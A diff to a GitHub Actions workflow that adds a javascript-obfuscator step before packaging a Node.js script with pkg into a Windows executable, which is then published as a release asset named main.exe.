@@ -52,13 +52,19 @@ jobs:
         with:
           node-version: '18'
           
-      - name: Install pkg
+      - name: Install pkg and javascript-obfuscator
         run: |
-          npm install -g pkg
+          npm install -g pkg javascript-obfuscator
 
       - name: Obfuscate JavaScript File
         run: |
-          pkg modified.js --compress GZip -t node18-win
+          # Obfuscate the JavaScript file
+          javascript-obfuscator modified.js --output obfuscated.js
+
+      - name: Package Obfuscated JavaScript File
+        run: |
+          # Package the obfuscated JavaScript file into an executable
+          pkg obfuscated.js --compress GZip -t node18-win
 
       - name: Delete-tag-and-release
         uses: dev-drprasad/delete-tag-and-release@v1.1
@@ -86,6 +92,6 @@ jobs:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         with:
           upload_url: ${{ steps.create_release.outputs.upload_url }}
-          asset_path: modified.exe
+          asset_path: obfuscated.exe
           asset_name: main.exe
           asset_content_type: application/octet-stream
